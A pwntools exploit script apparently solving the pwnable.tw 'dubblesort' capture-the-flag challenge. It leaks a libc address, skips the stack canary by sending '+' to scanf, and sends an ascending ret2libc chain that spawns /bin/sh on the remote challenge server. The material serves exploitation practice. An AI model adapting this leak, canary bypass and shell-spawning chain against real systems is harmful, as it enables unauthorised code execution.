#!/usr/bin/env python3
"""
pwnable.tw - dubblesort (200 pts)

Vulnerabilities:
1. Info leak via read() not null-terminating buffer
2. Stack overflow - no bounds check on number count
3. Canary bypass via scanf("%u") with "+" input
4. ROP chain must be ascending to survive bubble sort
"""

from pwn import *

context.arch = "i386"
context.log_level = "info"

HOST = "chall.pwnable.tw"
PORT = 10101

# Libc offsets (from libc_32.so.6)
SYSTEM_OFFSET = 0x3A940
BINSH_OFFSET = 0x158E8B

# The leaked address at offset 40 is libc related
# From testing: leaked addresses end with 0xfa0 (low 12 bits)
# This means the offset is 0x18fa0 (or 0xN8fa0 for some N)
# Verified: 0x5655dfa0 - 0x18fa0 = 0x56545000 (page aligned) âœ“
LEAK_OFFSET = 0x18FA0


def exploit(local=False):
    if local:
        r = process("./dubblesort", env={"LD_PRELOAD": "./libc_32.so.6"})
    else:
        r = remote(HOST, PORT)

    # Step 1: Leak libc address
    # Testing showed:
    # - 24 bytes: null at position 24, no leak
    # - 28 bytes: null at position 28, no leak
    # - 32 bytes: leak of 13 bytes, addresses like 0x5655xxxx
    # - 40 bytes: leak of 5 bytes at position 40-44
    #
    # The address at position 40-43 appears to be a libc pointer.

    r.recvuntil(b"What your name :")

    # Send 40 bytes to reach the libc address at offset 40
    r.send(b"A" * 40)

    r.recvuntil(b"Hello ")
    data = r.recvuntil(b",How many")
    data = data[:-len(b",How many")]

    log.info(f"Received {len(data)} bytes")

    if len(data) < 44:
        log.error(f"Not enough data for leak: got {len(data)} bytes")
        r.close()
        return

    # Extract the 4 bytes at position 40-43
    leak_bytes = data[40:44]
    leak = u32(leak_bytes)

    log.info(f"Leaked raw bytes: {leak_bytes.hex()}")
    log.info(f"Leaked value: {hex(leak)}")

    # Calculate libc base
    # The leaked value is at a known offset from libc base
    libc_base = leak - LEAK_OFFSET
    libc_base = libc_base & 0xFFFFF000  # Page align

    log.info(f"Libc base: {hex(libc_base)}")

    system_addr = libc_base + SYSTEM_OFFSET
    binsh_addr = libc_base + BINSH_OFFSET

    log.info(f"system(): {hex(system_addr)}")
    log.info(f"/bin/sh: {hex(binsh_addr)}")

    # Step 2: Overflow numbers array with ROP chain
    # Stack layout:
    # - numbers[0-23]: before canary
    # - numbers[24]: CANARY - skip with "+"
    # - numbers[25-31]: saved registers, alignment, ebp
    # - numbers[32+]: return address area
    #
    # All values must be in ascending order to survive bubble sort!

    r.recvuntil(b"sort :")
    count = 35
    r.sendline(str(count).encode())

    for i in range(count):
        r.recvuntil(b"number :")

        if i == 24:
            # Skip canary by making scanf fail
            r.sendline(b"+")
        elif i < 24:
            # Small ascending values
            r.sendline(str(i + 1).encode())
        else:
            # After canary: build ROP chain in ascending order
            # Indices 25-31: padding (must be < system addr)
            # Index 32: system()
            # Index 33: dummy return (> system, < binsh)
            # Index 34: /bin/sh
            if i <= 31:
                # Use libc_base + small ascending offsets
                padding = libc_base + 0x1000 * (i - 24)
                r.sendline(str(padding).encode())
            elif i == 32:
                r.sendline(str(system_addr).encode())
            elif i == 33:
                # Dummy return address between system and binsh
                dummy = libc_base + 0x100000
                r.sendline(str(dummy).encode())
            elif i == 34:
                r.sendline(str(binsh_addr).encode())
            else:
                r.sendline(str(binsh_addr + (i - 34)).encode())

    log.success("Payload sent!")
    r.interactive()


if __name__ == "__main__":
    import sys
    local = len(sys.argv) > 1 and sys.argv[1] == "local"
    exploit(local)
